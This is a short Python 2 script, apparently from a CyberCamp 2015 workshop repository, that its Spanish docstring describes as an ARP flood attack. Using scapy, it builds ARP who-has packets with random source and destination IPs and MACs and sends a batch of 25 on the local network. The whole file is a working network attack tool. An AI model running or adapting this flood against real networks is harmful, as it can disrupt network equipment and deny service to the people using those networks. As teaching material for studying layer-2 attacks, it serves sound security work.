# -*- coding: utf-8 -*-

"""
Este fichero contiene la implementacion de un ataque ARP flood.
"""

from scapy.all import ARP, sendp, Ether, IP, UDP, BOOTP, DHCP, RandMAC, RandString, RandIP


# ----------------------------------------------------------------------
def banner():
	"""
	Show author banner
	"""
	return """
+---------------------------------------------------------+
|Author: Daniel Garcia (cr0hn) - @ggdaniel                |
|Site: http://abirtone.com                                |
|Sources site: https://github.com/abirtone/cybercamp-2015 |
+---------------------------------------------------------+

"""


# ----------------------------------------------------------------------
def main():

	ether = Ether(src="ff:ff:ff:ff:ff:ff")
	arp = ARP(op="who-has", psrc=RandIP(), pdst=RandIP(), hwsrc=RandMAC(), hwdst=RandMAC())

	pkt = ether/arp

	pkt_lst=[]
	for x in xrange(25):
		pkt_lst.append(pkt)

	sendp(pkt_lst)

if __name__ == '__main__':

	print banner()

	main()
